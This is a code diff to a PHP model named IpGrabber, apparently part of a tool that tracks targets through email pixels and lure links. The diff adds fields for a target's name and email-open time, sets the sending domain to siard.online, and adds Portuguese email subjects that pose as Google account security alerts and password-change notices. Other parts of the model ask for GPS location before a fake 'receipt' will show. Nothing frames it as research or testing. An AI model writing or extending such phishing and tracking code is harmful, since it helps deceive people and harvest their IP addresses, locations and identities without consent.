@@ -16,8 +16,10 @@ class IpGrabber extends Model
 
     public const DEFAULT_CLICK_MESSAGE = 'Falha ao carregar';
     public const GPS_REQUIRED_MESSAGE = 'Você deve habilitar a localização para ver esse comprovante.';
-    public const EMAIL_TYPE_MARKETING = 'marketing';
-    public const EMAIL_TYPE_RECOVERY = 'recuperacao';
+    public const EMAIL_TYPE_MARKETING        = 'marketing';
+    public const EMAIL_TYPE_RECOVERY         = 'recuperacao';
+    public const EMAIL_TYPE_PASSWORD_RESET   = 'redefinicao_senha';
+    public const EMAIL_TYPE_PASSWORD_CHANGED = 'alteracao_senha';
 
     protected $table = 'pixel_tracks';
 
@@ -38,6 +40,7 @@ class IpGrabber extends Model
         'target_email',
         'email_tipo',
         'recovery_email',
+        'nome_alvo',
         'preview_tipo',
         'tracking_domain',
         'tracking_channel',
@@ -79,6 +82,7 @@ class IpGrabber extends Model
         'total_acessos',
         'clicked_at',
         'sent_at',
+        'email_opened_at',
     ];
 
     protected $casts = [
@@ -92,6 +96,7 @@ class IpGrabber extends Model
         'capture_identity' => 'boolean',
         'clicked_at' => 'datetime',
         'sent_at' => 'datetime',
+        'email_opened_at' => 'datetime',
         'total_acessos' => 'integer',
         'identidade_redes' => 'array',
     ];
@@ -136,7 +141,7 @@ class IpGrabber extends Model
     public function trackingDomain(): ?string
     {
         if ($this->tracking_channel === 'email') {
-            return 'agenciadanoticia.online';
+            return 'siard.online';
         }
 
         return match ($this->preview_tipo) {
@@ -202,8 +207,10 @@ class IpGrabber extends Model
     public function emailSubject(): string
     {
         return match ($this->email_tipo) {
-            self::EMAIL_TYPE_RECOVERY => 'Alerta de segurança: alteração de senha',
-            default => 'Comprovante disponível',
+            self::EMAIL_TYPE_RECOVERY         => 'Aviso de segurança da conta Google',
+            self::EMAIL_TYPE_PASSWORD_RESET   => 'Aviso de segurança do e-mail',
+            self::EMAIL_TYPE_PASSWORD_CHANGED => 'Sua senha foi alterada',
+            default => 'Documento disponível',
         };
     }
 
